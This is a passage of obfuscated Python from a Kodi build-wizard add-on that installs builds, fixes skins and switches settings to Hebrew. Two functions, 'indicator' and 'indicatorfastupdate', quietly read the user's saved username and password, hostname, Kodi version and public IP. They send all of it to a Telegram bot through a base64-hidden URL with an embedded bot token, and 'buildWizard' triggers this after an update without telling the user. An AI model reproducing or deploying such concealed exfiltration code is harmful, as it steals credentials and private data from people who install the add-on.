        O000O0O0O000OO0O0 ={'Access-Control-Allow-Headers':'Content-Length'}#line:3421
        O0000000OO000O0O0 =urllib .urlencode (OOO0OOOOO000O00OO )#line:3422
        OOO0O0OOO0O00OO00 =O00OO00O00OO0OOOO .open (OO000O00O0O0O0O00 +'&'+O0000000OO000O0O0 )#line:3423
        chunk_read (OOO0O0OOO0O00OO00 ,report_hook =chunk_report ,dp =OOOOO0OO0OOO00000 ,destination =O0000OO000000O0OO ,filesize =O0OOO00OO00O000OO )#line:3424
    return (OO00000O0OO0000OO )#line:3428
def kodi17Fix ():#line:3429
	OO0O0O000OO0O0O00 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3430
	O0O00OOOOOO0O00O0 =[]#line:3431
	for O00O00O0O0OO0OOO0 in sorted (OO0O0O000OO0O0O00 ,key =lambda OOO0O00O00O0OOOOO :OOO0O00O00O0OOOOO ):#line:3432
		OOOO0OOOO0O00O0OO =os .path .join (O00O00O0O0OO0OOO0 ,'addon.xml')#line:3433
		if os .path .exists (OOOO0OOOO0O00O0OO ):#line:3434
			OO000OO000O00O0OO =O00O00O0O0OO0OOO0 .replace (ADDONS ,'')[1 :-1 ]#line:3435
			OOO00OOO0O00O00O0 =open (OOOO0OOOO0O00O0OO )#line:3436
			O0O000OO0OOO00OOO =OOO00OOO0O00O00O0 .read ()#line:3437
			O0OOO0O0OO00O0OO0 =parseDOM (O0O000OO0OOO00OOO ,'addon',ret ='id')#line:3438
			OOO00OOO0O00O00O0 .close ()#line:3439
			try :#line:3440
				O00000000O00OO0O0 =xbmcaddon .Addon (id =O0OOO0O0OO00O0OO0 [0 ])#line:3441
			except :#line:3442
				try :#line:3443
					log ("%s was disabled"%O0OOO0O0OO00O0OO0 [0 ],xbmc .LOGDEBUG )#line:3444
					O0O00OOOOOO0O00O0 .append (O0OOO0O0OO00O0OO0 [0 ])#line:3445
				except :#line:3446
					try :#line:3447
						log ("%s was disabled"%OO000OO000O00O0OO ,xbmc .LOGDEBUG )#line:3448
						O0O00OOOOOO0O00O0 .append (OO000OO000O00O0OO )#line:3449
					except :#line:3450
						if len (O0OOO0O0OO00O0OO0 )==0 :log ("Unabled to enable: %s(Cannot Determine Addon ID)"%OO000OO000O00O0OO ,xbmc .LOGERROR )#line:3451
						else :log ("Unabled to enable: %s"%O00O00O0O0OO0OOO0 ,xbmc .LOGERROR )#line:3452
	if len (O0O00OOOOOO0O00O0 )>0 :#line:3453
		O0O00O0OOO000OO0O =0 #line:3454
		DP .create (ADDONTITLE ,'[COLOR %s]Enabling disabled Addons'%COLOR2 ,'','Please Wait[/COLOR]')#line:3455
		for O0OO0O0OO00OOO00O in O0O00OOOOOO0O00O0 :#line:3456
			O0O00O0OOO000OO0O +=1 #line:3457
			OOO0000O0OOO00O0O =int (percentage (O0O00O0OOO000OO0O ,len (O0O00OOOOOO0O00O0 )))#line:3458
			DP .update (OOO0000O0OOO00O0O ,"","Enabling: [COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OO0O0OO00OOO00O ))#line:3459
			addonDatabase (O0OO0O0OO00OOO00O ,1 )#line:3460
			if DP .iscanceled ():break #line:3461
		if DP .iscanceled ():#line:3462
			DP .close ()#line:3463
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Enabling Addons Cancelled![/COLOR]"%COLOR2 )#line:3464
			sys .exit ()#line:3465
		DP .close ()#line:3466
	forceUpdate ()#line:3467
def indicator ():#line:3469
       try :#line:3470
          import json #line:3471
          wiz .log ('FRESH MESSAGE')#line:3472
          O00O0O0O00OOO0OOO =(ADDON .getSetting ("user"))#line:3473
          O00O000000OOO0OO0 =(ADDON .getSetting ("pass"))#line:3474
          O00O0O0O00O0OO00O =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3475
          O0OOO0000O0O0O00O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc1MDEwMDI1NjpBQUVJVnpTSndOM2t6T25EV0F3Yi1LTkk3VUREY2N6aEx6VS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNDE1ODcxNzk3JnRleHQ915TXqten15nXnyDXkNeqINeU15HXmdec15Mg16nXnNeaIA=='#line:3476
          OO00OO00O0000O0O0 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3477
          OO0OO0OO0O00O000O =str (json .loads (OO00OO00O0000O0O0 )['ip'])#line:3478
          O0O000O000O00OOOO =O00O0O0O00OOO0OOO #line:3479
          O0OOOOO00O00OO00O =O00O000000OOO0OO0 #line:3480
          import socket #line:3481
          OO00OO00O0000O0O0 =urllib2 .urlopen (O0OOO0000O0O0O00O .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+O0O000O000O00OOOO +' - '+O0OOOOO00O00OO00O +' - '+O00O0O0O00O0OO00O +' - '+OO0OO0OO0O00O000O ).readlines ()#line:3482
       except :pass #line:3484
def indicatorfastupdate ():#line:3486
       try :#line:3487
          import json #line:3488
          wiz .log ('FRESH MESSAGE')#line:3489
          O0O0OO00OO00000O0 =(ADDON .getSetting ("user"))#line:3490
          O00O0OO000O0O00OO =(ADDON .getSetting ("pass"))#line:3491
          O0OOO0O0000OOO000 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3492
          O0OOO00O0O0OO0OOO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0g16LXqdeUINei15PXm9eV158g157XlNeZ16gg'#line:3494
          OO0000000O0OO0O00 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3495
          O0OO0OO00OOOO0OOO =str (json .loads (OO0000000O0OO0O00 )['ip'])#line:3496
          O0O0OOO00OOOOOOOO =O0O0OO00OO00000O0 #line:3497
          OO0OOO000OO0OOO00 =O00O0OO000O0O00OO #line:3498
          import socket #line:3500
          OO0000000O0OO0O00 =urllib2 .urlopen (O0OOO00O0O0OO0OOO .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+O0O0OOO00OOOOOOOO +' - '+OO0OOO000OO0OOO00 +' - '+O0OOO0O0000OOO000 +' - '+O0OO0OO00OOOO0OOO ).readlines ()#line:3501
       except :pass #line:3503
def skinfix18 ():#line:3505
	if KODIV >=18 and os .path .exists (os .path .join (ADDONS ,SKINID18 )):#line:3506
		OO0000OO0O00OOOO0 =wiz .workingURL (SKINID18DDONXML )#line:3507
		if OO0000OO0O00OOOO0 ==True :#line:3508
			OOOO00OO0OO000OOO =wiz .parseDOM (wiz .openURL (SKINID18DDONXML ),'addon',ret ='version',attrs ={'id':SKINID18 })#line:3509
			if len (OOOO00OO0OO000OOO )>0 :#line:3510
				OO000O0OO0000O00O ='%s-%s.zip'%(SKINID18 ,OOOO00OO0OO000OOO [0 ])#line:3511
				OO00O0O0OO0O0O0O0 =wiz .workingURL (SKIN18ZIPURL +OO000O0OO0000O00O )#line:3512
				if OO00O0O0OO0O0O0O0 ==True :#line:3513
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3514
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3515
					OOOO0O00000000O00 =os .path .join (PACKAGES ,OO000O0OO0000O00O )#line:3516
					try :os .remove (OOOO0O00000000O00 )#line:3517
					except :pass #line:3518
					downloader .download (SKIN18ZIPURL +OO000O0OO0000O00O ,OOOO0O00000000O00 ,DP )#line:3519
					extract .all (OOOO0O00000000O00 ,HOME ,DP )#line:3520
					try :#line:3521
						O0O0O0OO0000OOO00 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3522
						OOOOO00OOO0000OO0 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3523
						os .rename (O0O0O0OO0000OOO00 ,OOOOO00OOO0000OO0 )#line:3524
					except :#line:3525
						pass #line:3526
					try :#line:3527
						O00O0O000O0OOOO0O =open (os .path .join (ADDONS ,SKINID18 ,'addon.xml'),mode ='r');OOO0OOOOOOO0OO000 =O00O0O000O0OOOO0O .read ();O00O0O000O0OOOO0O .close ()#line:3528
						O0OO000000OOO0OO0 =wiz .parseDOM (OOO0OOOOOOO0OO000 ,'addon',ret ='name',attrs ={'id':SKINID18 })#line:3529
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OO000000OOO0OO0 [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID18 ,'icon.png'))#line:3530
					except :#line:3531
						pass #line:3532
					if KODIV >=17 :wiz .addonDatabase (SKINID18 ,1 )#line:3533
					DP .close ()#line:3534
					xbmc .sleep (500 )#line:3535
					wiz .forceUpdate (True )#line:3536
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3537
				else :#line:3538
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3539
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%OO00O0O0OO0O0O0O0 ,xbmc .LOGERROR )#line:3540
			else :#line:3541
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3542
		else :#line:3543
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3544
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3545
def skinfix17 ():#line:3546
	if KODIV >=17 and KODIV <18 and os .path .exists (os .path .join (ADDONS ,SKINID17 )):#line:3547
		OOOOO00O0O0OOOOO0 =wiz .workingURL (SKINID17DDONXML )#line:3548
		if OOOOO00O0O0OOOOO0 ==True :#line:3549
			OOO0O0O0O00OO00O0 =wiz .parseDOM (wiz .openURL (SKINID17DDONXML ),'addon',ret ='version',attrs ={'id':SKINID17 })#line:3550
			if len (OOO0O0O0O00OO00O0 )>0 :#line:3551
				OO0OOOO000O00000O ='%s-%s.zip'%(SKINID17 ,OOO0O0O0O00OO00O0 [0 ])#line:3552
				OO0O0OO0OO0O0OOO0 =wiz .workingURL (SKIN17ZIPURL +OO0OOOO000O00000O )#line:3553
				if OO0O0OO0OO0O0OOO0 ==True :#line:3554
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3555
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3556
					O00000OO00O00O0O0 =os .path .join (PACKAGES ,OO0OOOO000O00000O )#line:3557
					try :os .remove (O00000OO00O00O0O0 )#line:3558
					except :pass #line:3559
					downloader .download (SKIN17ZIPURL +OO0OOOO000O00000O ,O00000OO00O00O0O0 ,DP )#line:3560
					extract .all (O00000OO00O00O0O0 ,HOME ,DP )#line:3561
					try :#line:3562
						O0OO0OOOOO000OOOO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3563
						O00OO0O000O000000 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3564
						os .rename (O0OO0OOOOO000OOOO ,O00OO0O000O000000 )#line:3565
					except :#line:3566
						pass #line:3567
					try :#line:3568
						O00O0O00000O000O0 =open (os .path .join (ADDONS ,SKINID17 ,'addon.xml'),mode ='r');OO0O0OOOO00OOOO0O =O00O0O00000O000O0 .read ();O00O0O00000O000O0 .close ()#line:3569
						OOOOOO0OOO0O00O00 =wiz .parseDOM (OO0O0OOOO00OOOO0O ,'addon',ret ='name',attrs ={'id':SKINID17 })#line:3570
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOOOO0OOO0O00O00 [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID17 ,'icon.png'))#line:3571
					except :#line:3572
						pass #line:3573
					if KODIV >=17 :wiz .addonDatabase (SKINID17 ,1 )#line:3574
					DP .close ()#line:3575
					xbmc .sleep (500 )#line:3576
					wiz .forceUpdate (True )#line:3577
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3578
				else :#line:3579
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3580
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%OO0O0OO0OO0O0OOO0 ,xbmc .LOGERROR )#line:3581
			else :#line:3582
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3583
		else :#line:3584
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3585
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3586
def fix17update ():#line:3587
	if KODIV >=17 and KODIV <18 :#line:3588
		wiz .kodi17Fix ()#line:3589
		xbmc .sleep (4000 )#line:3590
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3591
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3592
		fixfont ()#line:3593
		O00OO00OOOO00OOO0 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3594
		try :#line:3596
			O0000O0OO0OOO00O0 =open (O00OO00OOOO00OOO0 ,'r')#line:3597
			OOOO00OOO0O0O000O =O0000O0OO0OOO00O0 .read ()#line:3598
			O0000O0OO0OOO00O0 .close ()#line:3599
			O0O0O000O0000O000 ='<import addon="xbmc.gui" version="5.14.0(.+?)/>'#line:3600
			OOOO00OOOOO0O0000 =re .compile (O0O0O000O0000O000 ).findall (OOOO00OOO0O0O000O )[0 ]#line:3601
			O0000O0OO0OOO00O0 =open (O00OO00OOOO00OOO0 ,'w')#line:3602
			O0000O0OO0OOO00O0 .write (OOOO00OOO0O0O000O .replace ('<import addon="xbmc.gui" version="5.14.0%s/>'%OOOO00OOOOO0O0000 ,'<import addon="xbmc.gui" version="5.12.0"/>'))#line:3603
			O0000O0OO0OOO00O0 .close ()#line:3604
		except :#line:3605
				pass #line:3606
		wiz .kodi17Fix ()#line:3607
		O00OO00OOOO00OOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3608
		try :#line:3609
			O0000O0OO0OOO00O0 =open (O00OO00OOOO00OOO0 ,'r')#line:3610
			OOOO00OOO0O0O000O =O0000O0OO0OOO00O0 .read ()#line:3611
			O0000O0OO0OOO00O0 .close ()#line:3612
			O0O0O000O0000O000 ='<keyboardlayouts default="true(.+?)/keyboardlayouts>'#line:3613
			OOOO00OOOOO0O0000 =re .compile (O0O0O000O0000O000 ).findall (OOOO00OOO0O0O000O )[0 ]#line:3614
			O0000O0OO0OOO00O0 =open (O00OO00OOOO00OOO0 ,'w')#line:3615
			O0000O0OO0OOO00O0 .write (OOOO00OOO0O0O000O .replace ('<keyboardlayouts default="true%s/keyboardlayouts>'%OOOO00OOOOO0O0000 ,'<keyboardlayouts>English QWERTY|Hebrew QWERTY</keyboardlayouts>'))#line:3616
			O0000O0OO0OOO00O0 .close ()#line:3617
		except :#line:3618
				pass #line:3619
		swapSkins ('skin.Premium.mod')#line:3620
def fix18update ():#line:3622
	if KODIV >=18 :#line:3623
		xbmc .sleep (4000 )#line:3624
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3625
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3626
		fixfont ()#line:3627
		OOOOOOOOO0000OO00 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3628
		try :#line:3629
			OO00O0OO00O000000 =open (OOOOOOOOO0000OO00 ,'r')#line:3630
			O0000OO0O0O0O00O0 =OO00O0OO00O000000 .read ()#line:3631
			OO00O0OO00O000000 .close ()#line:3632
			OOO0000000O0OO0O0 ='<import addon="xbmc.gui" version="5.12.0(.+?)/>'#line:3633
			OO0OO0OO0000O000O =re .compile (OOO0000000O0OO0O0 ).findall (O0000OO0O0O0O00O0 )[0 ]#line:3634
			OO00O0OO00O000000 =open (OOOOOOOOO0000OO00 ,'w')#line:3635
			OO00O0OO00O000000 .write (O0000OO0O0O0O00O0 .replace ('<import addon="xbmc.gui" version="5.12.0%s/>'%OO0OO0OO0000O000O ,'<import addon="xbmc.gui" version="5.14.0"/>'))#line:3636
			OO00O0OO00O000000 .close ()#line:3637
		except :#line:3638
				pass #line:3639
		wiz .kodi17Fix ()#line:3640
		OOOOOOOOO0000OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3641
		try :#line:3642
			OO00O0OO00O000000 =open (OOOOOOOOO0000OO00 ,'r')#line:3643
			O0000OO0O0O0O00O0 =OO00O0OO00O000000 .read ()#line:3644
			OO00O0OO00O000000 .close ()#line:3645
			OOO0000000O0OO0O0 ='<setting id="locale.keyboardlayouts" default="true(.+?)/setting>'#line:3646
			OO0OO0OO0000O000O =re .compile (OOO0000000O0OO0O0 ).findall (O0000OO0O0O0O00O0 )[0 ]#line:3647
			OO00O0OO00O000000 =open (OOOOOOOOO0000OO00 ,'w')#line:3648
			OO00O0OO00O000000 .write (O0000OO0O0O0O00O0 .replace ('<setting id="locale.keyboardlayouts" default="true%s/setting>'%OO0OO0OO0000O000O ,'<setting id="locale.keyboardlayouts">English QWERTY|Hebrew QWERTY</setting>'))#line:3649
			OO00O0OO00O000000 .close ()#line:3650
		except :#line:3651
				pass #line:3652
		swapSkins ('skin.Premium.mod')#line:3653
def buildWizard (OO00OOOOOO00OOO0O ,OOO0O0O00O0O0O00O ,theme =None ,over =False ):#line:3656
	if over ==False :#line:3657
		OOOO0OOOO0OO000O0 =wiz .checkBuild (OO00OOOOOO00OOO0O ,'url')#line:3658
		if OOOO0OOOO0OO000O0 ==False :#line:3660
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]אנא המתן...[/COLOR]'%COLOR2 )#line:3665
			xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.Anonymous/?mode=install&name=+Kodi+Premium&url=gui)")#line:3666
			return #line:3667
		OOO00O0O00O0OO00O =wiz .workingURL (OOOO0OOOO0OO000O0 )#line:3668
		if OOO00O0O00O0OO00O ==False :#line:3669
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Build Zip Error: %s[/COLOR]"%(COLOR2 ,OOO00O0O00O0OO00O ))#line:3670
			return #line:3671
	if OOO0O0O00O0O0O00O =='gui':#line:3672
		if OO00OOOOOO00OOO0O ==BUILDNAME :#line:3673
			if over ==True :O00OOOO00000O00O0 =1 #line:3674
			else :O00OOOO00000O00O0 =1 #line:3675
		else :#line:3676
			O00OOOO00000O00O0 =1 #line:3677
		if O00OOOO00000O00O0 :#line:3678
			remove_addons ()#line:3679
			remove_addons2 ()#line:3680
			O0000OOOO0OO0000O =wiz .checkBuild (OO00OOOOOO00OOO0O ,'gui')#line:3681
			O0O0OO0OOO0O0OOOO =OO00OOOOOO00OOO0O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3682
			if not wiz .workingURL (O0000OOOO0OO0000O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3683
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3684
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO00OOOOOO00OOO0O ),'','אנא המתן')#line:3685
			OO00OOO0OO0OO0000 =os .path .join (PACKAGES ,'%s_guisettings.zip'%O0O0OO0OOO0O0OOOO )#line:3686
			try :os .remove (OO00OOO0OO0OO0000 )#line:3687
			except :pass #line:3688
			logging .warning (O0000OOOO0OO0000O )#line:3689
			if 'google'in O0000OOOO0OO0000O :#line:3690
			   O0OO00OO0O00OOOO0 =googledrive_download (O0000OOOO0OO0000O ,OO00OOO0OO0OO0000 ,DP ,wiz .checkBuild (OO00OOOOOO00OOO0O ,'filesize'))#line:3691
			else :#line:3694
			  downloader .download (O0000OOOO0OO0000O ,OO00OOO0OO0OO0000 ,DP )#line:3695
			xbmc .sleep (100 )#line:3696
			O0O000000000OOO00 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO00OOOOOO00OOO0O )#line:3697
			DP .update (0 ,O0O000000000OOO00 ,'','אנא המתן')#line:3698
			extract .all (OO00OOO0OO0OO0000 ,HOME ,DP ,title =O0O000000000OOO00 )#line:3699
			DP .close ()#line:3700
			wiz .defaultSkin ()#line:3701
			wiz .lookandFeelData ('save')#line:3702
			wiz .kodi17Fix ()#line:3703
			if KODIV >=18 :#line:3704
				skindialogsettind18 ()#line:3705
			xbmc .executebuiltin ("ReloadSkin()")#line:3706
			if INSTALLMETHOD ==1 :O00O000O00000OO0O =1 #line:3707
			elif INSTALLMETHOD ==2 :O00O000O00000OO0O =0 #line:3708
			else :DP .close ()#line:3709
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:3710
			indicatorfastupdate ()#line:3711
		else :#line:3713
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3714
	if OOO0O0O00O0O0O00O =='gui2':#line:3715
		if OO00OOOOOO00OOO0O ==BUILDNAME :#line:3716
			if over ==True :O00OOOO00000O00O0 =1 #line:3717
			else :O00OOOO00000O00O0 =1 #line:3718
		else :#line:3719
			O00OOOO00000O00O0 =1 #line:3720
		if O00OOOO00000O00O0 :#line:3721
			remove_addons ()#line:3722
			remove_addons2 ()#line:3723
			O0000OOOO0OO0000O =wiz .checkBuild (OO00OOOOOO00OOO0O ,'gui')#line:3724
			O0O0OO0OOO0O0OOOO =OO00OOOOOO00OOO0O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3725
			if not wiz .workingURL (O0000OOOO0OO0000O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3726
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3727
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO00OOOOOO00OOO0O ),'','אנא המתן')#line:3728
			OO00OOO0OO0OO0000 =os .path .join (PACKAGES ,'%s_guisettings.zip'%O0O0OO0OOO0O0OOOO )#line:3729
			try :os .remove (OO00OOO0OO0OO0000 )#line:3730
			except :pass #line:3731
			logging .warning (O0000OOOO0OO0000O )#line:3732
			if 'google'in O0000OOOO0OO0000O :#line:3733
			   O0OO00OO0O00OOOO0 =googledrive_download (O0000OOOO0OO0000O ,OO00OOO0OO0OO0000 ,DP ,wiz .checkBuild (OO00OOOOOO00OOO0O ,'filesize'))#line:3734
			else :#line:3737
			  downloader .download (O0000OOOO0OO0000O ,OO00OOO0OO0OO0000 ,DP )#line:3738
			xbmc .sleep (100 )#line:3739
			O0O000000000OOO00 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO00OOOOOO00OOO0O )#line:3740
			DP .update (0 ,O0O000000000OOO00 ,'','אנא המתן')#line:3741
			extract .all (OO00OOO0OO0OO0000 ,HOME ,DP ,title =O0O000000000OOO00 )#line:3742
			DP .close ()#line:3743
			wiz .defaultSkin ()#line:3744
			wiz .lookandFeelData ('save')#line:3745
			if INSTALLMETHOD ==1 :O00O000O00000OO0O =1 #line:3748
			elif INSTALLMETHOD ==2 :O00O000O00000OO0O =0 #line:3749
			else :DP .close ()#line:3750
		else :#line:3752
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3753
	elif OOO0O0O00O0O0O00O =='fresh':#line:3754
		freshStart (OO00OOOOOO00OOO0O )#line:3755
	elif OOO0O0O00O0O0O00O =='normal':#line:3756
		if url =='normal':#line:3757
			if KEEPTRAKT =='true':#line:3758
				traktit .autoUpdate ('all')#line:3759
				wiz .setS ('traktlastsave',str (THREEDAYS ))#line:3760
			if KEEPREAL =='true':#line:3761
				debridit .autoUpdate ('all')#line:3762
				wiz .setS ('debridlastsave',str (THREEDAYS ))#line:3763
			if KEEPLOGIN =='true':#line:3764
				loginit .autoUpdate ('all')#line:3765
				wiz .setS ('loginlastsave',str (THREEDAYS ))#line:3766
		OO00OOO0OOOOO0O0O =int (KODIV );O00OOO0O0O00OO0O0 =int (float (wiz .checkBuild (OO00OOOOOO00OOO0O ,'kodi')))#line:3767
		if not OO00OOO0OOOOO0O0O ==O00OOO0O0O00OO0O0 :#line:3768
			if OO00OOO0OOOOO0O0O ==16 and O00OOO0O0O00OO0O0 <=15 :OO0OO000O00O00O00 =False #line:3769
			else :OO0OO000O00O00O00 =True #line:3770
		else :OO0OO000O00O00O00 =False #line:3771
		if OO0OO000O00O00O00 ==True :#line:3772
			O0OOOOOOO0000OOO0 =1 #line:3773
		else :#line:3774
			if not over ==False :O0OOOOOOO0000OOO0 =1 #line:3775
			else :O0OOOOOOO0000OOO0 =DIALOG .yesno (ADDONTITLE ,'התקנה רגילה:','מצב זה שומר הרחבות קיימות, האם להמשיך?',nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:3776
		if O0OOOOOOO0000OOO0 :#line:3777
			wiz .clearS ('build')#line:3778
			O0000OOOO0OO0000O =wiz .checkBuild (OO00OOOOOO00OOO0O ,'url')#line:3779
			O0O0OO0OOO0O0OOOO =OO00OOOOOO00OOO0O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3780
			if not wiz .workingURL (O0000OOOO0OO0000O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Build Install: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3781
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3782
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO00OOOOOO00OOO0O ,wiz .checkBuild (OO00OOOOOO00OOO0O ,'version')),'','אנא המתן')#line:3783
			OO00OOO0OO0OO0000 =os .path .join (PACKAGES ,'%s.zip'%O0O0OO0OOO0O0OOOO )#line:3784
			try :os .remove (OO00OOO0OO0OO0000 )#line:3785
			except :pass #line:3786
			logging .warning (O0000OOOO0OO0000O )#line:3787
			if 'google'in O0000OOOO0OO0000O :#line:3788
			   O0OO00OO0O00OOOO0 =googledrive_download (O0000OOOO0OO0000O ,OO00OOO0OO0OO0000 ,DP ,wiz .checkBuild (OO00OOOOOO00OOO0O ,'filesize'))#line:3789
			else :#line:3792
			  downloader .download (O0000OOOO0OO0000O ,OO00OOO0OO0OO0000 ,DP )#line:3793
			xbmc .sleep (1000 )#line:3794
			O0O000000000OOO00 ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO00OOOOOO00OOO0O ,wiz .checkBuild (OO00OOOOOO00OOO0O ,'version'))#line:3795
			DP .update (0 ,O0O000000000OOO00 ,'','Please Wait')#line:3796
			OO00O000O000OO00O ,OO0O0O000O000OO0O ,O0O0OO0O0OO00O000 =extract .all (OO00OOO0OO0OO0000 ,HOME ,DP ,title =O0O000000000OOO00 )#line:3797
			if int (float (OO00O000O000OO00O ))>0 :#line:3798
				wiz .fixmetas ()#line:3799
				wiz .lookandFeelData ('save')#line:3800
				wiz .defaultSkin ()#line:3801
				wiz .setS ('buildname',OO00OOOOOO00OOO0O )#line:3803
				wiz .setS ('buildversion',wiz .checkBuild (OO00OOOOOO00OOO0O ,'version'))#line:3804
				wiz .setS ('buildtheme','')#line:3805
				wiz .setS ('latestversion',wiz .checkBuild (OO00OOOOOO00OOO0O ,'version'))#line:3806
				wiz .setS ('lastbuildcheck',str (NEXTCHECK ))#line:3807
				wiz .setS ('installed','true')#line:3808
				wiz .setS ('extract',str (OO00O000O000OO00O ))#line:3809
